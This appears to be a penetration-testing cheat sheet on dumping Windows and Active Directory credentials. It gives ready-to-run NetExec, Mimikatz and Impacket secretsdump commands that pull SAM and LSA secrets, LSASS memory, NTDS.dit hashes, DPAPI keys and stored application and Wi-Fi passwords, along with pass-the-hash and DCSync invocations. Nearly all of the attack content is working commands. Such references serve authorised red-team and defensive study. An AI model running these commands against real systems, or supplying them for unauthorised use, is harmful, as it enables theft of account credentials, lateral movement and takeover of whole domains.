**Credential dumping** refers to extracting authentication material (passwords, hashes, Kerberos tickets, cached credentials) from Windows systems and Active Directory environments. Attackers use these techniques to escalate privileges, move laterally, and gain persistence.


--- 

## Common Targets for Credential Dumping

- **LSASS process memory**: Contains NTLM hashes, Kerberos tickets, and plaintext credentials in some cases.
- **SAM database**: Stores local account password hashes.
- **NTDS**: Active Directory database containing all domain user password hashes.
- **LSA Secrets**: Registry keys storing service account credentials, cached domain logons, and DPAPI keys.
- **Kerberos tickets**: Cached TGTs and service tickets in memory.


---

## NetExec 
**NetExec** is a post‑exploitation framework that  provides modules to dump credentials from multiple sources, including the SAM database, LSA secrets, and NTDS.dit on Domain Controllers. It also integrates techniques for extracting credentials from LSASS memory and parsing application configuration files.

#### Core System Databases

- `--lsa`: Dumps LSA secrets (cached credentials, service account passwords, DPAPI keys).

```bash
nxc smb <target_ip> -u <user> -p <password> --lsa
```

- `--sam`: Dumps local SAM database hashes.

```bash
nxc smb <target_ip> -u <user> -p <password> --sam
```

- `--ntds`: Dumps NTDS.dit database from a Domain Controller (domain user password hashes).

```bash
nxc smb <dc_ip> -u <user> -p <password> --ntds
```

---

#### LSASS and Memory Extraction

- `--lsassy`: Extracts credentials from LSASS memory using LSASSASSY technique.

```bash
nxc smb <target_ip> -u <user> -p <password> --lsassy
```

- `--nanodump`: Dumps LSASS memory using the nanodump method for offline parsing.

```bash
nxc smb <target_ip> -u <user> -p <password> --nanodump
```

---

#### Registry and Secrets

- `--winlogon`: Retrieves Winlogon registry data (may contain autologon credentials).

```bash
nxc smb <target_ip> -u <user> -p <password> --winlogon
```

- `--dpapi`: Dumps DPAPI credentials and master keys.

```bash
nxc smb <target_ip> -u <user> -p <password> --dpapi
```

---

#### Application Credentials

- `--mremoteng`: Extracts stored credentials from mRemoteNG configuration files.

```bash
nxc smb <target_ip> -u <user> -p <password> --mremoteng
```

- `--winscp`: Extracts stored credentials from WinSCP configuration files.

```bash
nxc smb <target_ip> -u <user> -p <password> --winscp
```

- `--putty`: Retrieves PuTTY private key files.

```bash
nxc smb <target_ip> -u <user> -p <password> --putty
```

- `--vnc`: Dumps stored VNC passwords.

```bash
nxc smb <target_ip> -u <user> -p <password> --vnc
```

---

#### User Artifacts

- `--powershell-history`: Retrieves PowerShell command history from user profiles.

```bash
nxc smb <target_ip> -u <user> -p <password> --powershell-history
```

- `--notepadpp`: Extracts Notepad++ session logs (may contain sensitive data).

```bash
nxc smb <target_ip> -u <user> -p <password> --notepadpp
```

- `--wifi`: Extracts saved Wi‑Fi profiles and pre‑shared keys.

```bash
nxc smb <target_ip> -u <user> -p <password> --wifi
```




---
## Mimikatz
Mimikatz is a well‑known tool for credential extraction on Windows. It can read LSASS memory to recover NTLM hashes, Kerberos tickets, and sometimes plaintext passwords. Beyond memory scraping, it supports advanced techniques such as DCSync to replicate domain hashes directly from a Domain Controller, and Pass‑the‑Ticket to inject Kerberos tickets.

To use it, you need to execute Mimikatz:
```bash
mimikatz.exe
privilege::debug
```
Then, you can use its various commands.

#### LSASS Memory

- `sekurlsa::logonpasswords`: Extracts credentials from LSASS memory (NTLM hashes, Kerberos tickets, sometimes plaintext passwords).
- `sekurlsa::tickets`: Lists Kerberos tickets cached in memory.
- `sekurlsa::minidump`: Loads an offline LSASS memory dump for credential extraction.


#### Local Secrets

- `lsadump::sam`: Dumps local SAM database hashes.
- `lsadump::lsa`: Dumps LSA secrets (service account passwords, cached domain credentials, DPAPI keys).


#### Domain Replication

- `lsadump::dcsync`: Performs a DCSync attack to request password hashes directly from a Domain Controller via replication.

#### Other Sensitive Data

- `crypto::certificates`: Lists and exports certificates from the local machine or user store (useful for authentication certificates).

- `dpapi::cred`: Decrypts DPAPI credential blobs (saved credentials, browser passwords, etc.).


---


## Impacket–secretsdump
**Impacket-secretsdump** is part of the Impacket toolkit and focuses on extracting credentials both locally and remotely. It can dump SAM and LSA secrets, parse NTDS.dit offline, or perform DCSync attacks if the account has replication rights. 

#### Local SAM and LSA Secrets

- **Dump local SAM database hashes** (local user accounts).
- **Dump LSA secrets** (cached domain credentials, service account passwords, DPAPI keys).

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

This requires the registry hive files (`SAM`, `SYSTEM`, `SECURITY`) from the target.

---

#### Remote Dumping with Credentials

- **Dump SAM, LSA, and cached credentials remotely** using valid credentials.

```bash
impacket-secretsdump domain/user:password@<target_ip>
```

- **Pass‑the‑Hash authentication** instead of a password:

```bash
impacket-secretsdump -hashes <LM_hash>:<NT_hash> domain/user@<target_ip>
```

---

#### NTDS.dit (Domain Controller Database)

- **Dump all domain user password hashes** from a Domain Controller.

```bash
impacket-secretsdump domain/admin:password@<dc_ip> -just-dc
```

- **Dump only NTLM hashes**:

```bash
impacket-secretsdump domain/admin:password@<dc_ip> -just-dc-ntlm
```

- **Dump a specific user** (e.g., krbtgt):

```bash
impacket-secretsdump -just-dc-user 'domain\krbtgt' domain/admin:password@<dc_ip>
```

---

#### DCSync Attack

- **Abuse replication privileges** to request password data directly from a DC without touching disk.

```bash
impacket-secretsdump -just-dc domain/admin:password@<dc_ip>
```

If the account has replication rights, this functions as a DCSync.
